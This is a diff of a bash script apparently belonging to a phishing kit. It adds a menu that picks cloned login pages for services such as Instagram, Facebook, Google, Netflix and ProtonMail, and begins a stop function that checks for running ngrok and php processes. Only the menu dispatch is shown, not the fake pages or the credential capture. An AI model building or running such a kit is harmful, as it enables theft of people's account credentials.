@@ -30,7 +30,73 @@ printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
+if [[ $option == 1 ]]; then
+server="instagram"
+start
 
+elif [[ $option == 2 ]]; then
+server="facebook"
+start
+elif [[ $option == 3 ]]; then
+server="snapchat"
+start
+elif [[ $option == 4 ]]; then
+server="twitter"
+start
+elif [[ $option == 5 ]]; then
+server="github"
+start
+elif [[ $option == 6 ]]; then
+server="google"
+start
+
+elif [[ $option == 7 ]]; then
+server="spotify"
+start
+
+elif [[ $option == 8 ]]; then
+server="netflix"
+start
+
+elif [[ $option == 9 ]]; then
+server="origin"
+start
+
+elif [[ $option == 10 ]]; then
+server="steam"
+start
+
+elif [[ $option == 11 ]]; then
+server="yahoo"
+start
+
+elif [[ $option == 12 ]]; then
+server="linkedin"
+start
+
+elif [[ $option == 13 ]]; then
+server="protonmail"
+start
+
+elif [[ $option == 14 ]]; then
+server="wordpress"
+start
+
+elif [[ $option == 15 ]]; then
+server="microsoft"
+start
+
+elif [[ $option == 16 ]]; then
+server="instafollowers"
+start
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
+
+stop() {
 
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
